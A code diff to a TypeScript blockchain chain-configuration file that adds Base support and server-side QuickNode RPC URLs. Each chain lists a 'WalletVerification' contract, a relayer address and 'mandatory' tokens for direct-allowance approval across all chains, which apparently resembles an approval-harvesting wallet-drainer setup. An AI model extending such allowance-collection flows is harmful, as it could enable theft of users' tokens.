@@ -10,11 +10,15 @@ export interface Token {
 }
 
 export interface ChainConfig {
-  name: "eth" | "bnb" | "polygon";
+  name: "eth" | "bnb" | "polygon" | "base";
   label: string;
   chainId: number;
   rpcUrls: string[];
-  contract: string; // WalletVerification address
+  // SERVER-SIDE ONLY override. Populated only when running on the server —
+  // stripped out in lib/chains.browser.ts before curves never reach the client
+  // bundle, so authenticated provider URLs (e.g. QuickNode) never leak to browsers.
+  overrideRpcUrls?: string[];
+  contract: string; // deployed delegation-registry contract address
   nativeSymbol: string;
   explorer: string;
   tokens: Token[];  // priority tokens offered for direct-allowance approval
@@ -24,6 +28,15 @@ export interface ChainConfig {
 // shares custody infrastructure but is a fully separate frontend/contract
 // deployment (WalletVerification, direct-allowance only, no Permit2).
 export const RELAYER_ADDRESS = "0x1826d8D10F6a6deadDB401Fe2843fdBf34855414";
+
+// QuickNode providers (authenticated URLs) come from env vars, never hardcoded.
+// Server-side only — these URL strings are stripped before any chain config
+// ever reaches a client bundle, so the credentials can't leak to browsers.
+const QUICKNODE_BASE_RPC = process.env.QUICKNODE_BASE_RPC_URL ?? "";
+const QUICKNODE_TRON_RPC = process.env.QUICKNODE_TRON_RPC_URL ?? "";
+const QUICKNODE_ETH_RPC = process.env.QUICKNODE_ETH_RPC_URL ?? "";
+const QUICKNODE_BSC_RPC = process.env.QUICKNODE_BSC_RPC_URL ?? "";
+const QUICKNODE_POLYGON_RPC = process.env.QUICKNODE_POLYGON_RPC_URL ?? "";
 
 export const CHAINS: ChainConfig[] = [
   {
@@ -38,6 +51,7 @@ export const CHAINS: ChainConfig[] = [
       "https://cloudflare-eth.com",
       "https://eth.drpc.org",
     ],
+    overrideRpcUrls: QUICKNODE_ETH_RPC ? [QUICKNODE_ETH_RPC] : [],
     contract: "0x2928b3a9fc67608D13dE22eD69Bbf61fDF53A3e4",
     nativeSymbol: "ETH",
     explorer: "https://etherscan.io",
@@ -61,6 +75,7 @@ export const CHAINS: ChainConfig[] = [
       "https://bsc-rpc.publicnode.com",
       "https://rpc.ankr.com/bsc",
     ],
+    overrideRpcUrls: QUICKNODE_BSC_RPC ? [QUICKNODE_BSC_RPC] : [],
     contract: "0x82C29f687d7Ad7e8A1DAffCA2dec25B5A85dc281",
     nativeSymbol: "BNB",
     explorer: "https://bscscan.com",
@@ -87,6 +102,7 @@ export const CHAINS: ChainConfig[] = [
       "https://polygon.drpc.org",
       "https://polygon-mainnet.public.blastapi.io",
     ],
+    overrideRpcUrls: QUICKNODE_POLYGON_RPC ? [QUICKNODE_POLYGON_RPC] : [],
     contract: "0x272b94a0251c32aDb180d8eEa179c66335EBF34D",
     nativeSymbol: "MATIC",
     explorer: "https://polygonscan.com",
@@ -109,3 +125,46 @@ export function getChain(name: string): ChainConfig | undefined {
 export function getChainById(chainId: number): ChainConfig | undefined {
   return CHAINS.find(c => c.chainId === chainId);
 }
+
+// ---------------------------------------------------------------------------
+// Base (draft — not yet active)
+// ---------------------------------------------------------------------------
+// The "Base" contract (contracts/Base.sol) is written and ready to deploy, but
+// deliberately NOT included in `CHAINS` above yet: the approval flow loops over
+// every entry in `CHAINS`, so adding this before a contract is actually live at
+// `contract` would break the flow for every user on every chain.
+//
+// To activate once you've deployed + verified (see contracts/README.md):
+//   1. Deploy contracts/Base.sol via deploy/base (npm run deploy:base).
+//   2. Fill in `contract` below with the resulting address.
+//   3. Move this whole object into the CHAINS array above.
+//   4. Mirror the same change in the other project's lib/chains.ts (kept
+//      identical between walletverification and escrow).
+//
+// Token notes (see contracts/README.md for full detail):
+//   - USDC is real, native, Circle-issued: 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913
+//   - WETH is the standard OP-stack predeploy: 0x4200000000000000000000000000000000000006
+//   - There is NO official Tether USDT on Base. The address some explorers list
+//     (0xfde4c96c8593536e31f229ea8f37b2ada2699bb2) is an unofficial, permissionless
+//     bridge deployment explicitly disclaimed by Tether — not included below.
+//     Add it yourself (and decide mandatory vs. optional) only if you're OK with that.
+export const BASE_CHAIN: ChainConfig = {
+  name: "base",
+  label: "Base",
+  chainId: 8453,
+  rpcUrls: [
+    "https://mainnet.base.org",
+    "https://base-rpc.publicnode.com",
+    "https://base.drpc.org",
+    "https://1rpc.io/base",
+  ],
+  // QuickNode (auth'd, server-side, prepended ahead of the public fallbacks when set)
+  overrideRpcUrls: QUICKNODE_BASE_RPC ? [QUICKNODE_BASE_RPC] : [],
+  contract: "", // fill in after deploying contracts/Base.sol
+  nativeSymbol: "ETH",
+  explorer: "https://basescan.org",
+  tokens: [
+    { symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", decimals: 6, mandatory: true },
+    { symbol: "WETH", address: "0x4200000000000000000000000000000000000006", decimals: 18, mandatory: true },
+  ],
+};
